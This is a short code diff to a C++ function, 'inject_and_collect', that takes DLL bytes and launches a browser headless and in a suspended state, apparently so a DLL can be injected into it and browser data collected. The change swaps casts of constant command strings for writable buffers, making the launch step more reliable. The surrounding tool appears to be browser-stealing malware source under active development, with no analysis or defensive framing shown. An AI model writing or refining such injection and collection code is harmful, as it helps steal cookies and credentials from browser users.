@@ -162,14 +162,18 @@ void inject_and_collect(const std::string& dll_bytes, const BrowserConfig& confi
     PROCESS_INFORMATION pi = {0};
 
     std::wstring cmd = std::wstring(config.exe_name.begin(), config.exe_name.end()) + L" --headless --disable-gpu";
-    BOOL success = CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    std::vector<wchar_t> cmd_buf(cmd.begin(), cmd.end());
+    cmd_buf.push_back(0);
+    BOOL success = CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     if (!success) {
         std::string path = find_browser_exe(config.name);
         if (!path.empty()) {
             std::wstring wpath = std::wstring(path.begin(), path.end());
             cmd = L"\"" + wpath + L"\" --headless --disable-gpu";
-            success = CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+            std::vector<wchar_t> cmd_buf_full(cmd.begin(), cmd.end());
+            cmd_buf_full.push_back(0);
+            success = CreateProcessW(NULL, cmd_buf_full.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
         }
     }
 
